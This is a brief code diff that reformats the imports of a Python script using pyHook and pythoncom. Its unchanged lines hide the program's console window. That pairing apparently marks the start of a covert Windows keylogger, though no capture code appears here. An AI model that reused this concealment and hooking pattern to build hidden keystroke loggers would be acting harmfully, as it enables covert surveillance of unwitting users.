@@ -1,5 +1,8 @@
-import pyHook, pythoncom
-import win32console, win32gui
+import win32console
+import win32gui
+
+import pyHook
+import pythoncom
 
 win = win32console.GetConsoleWindow()
 win32gui.ShowWindow(win, 0)
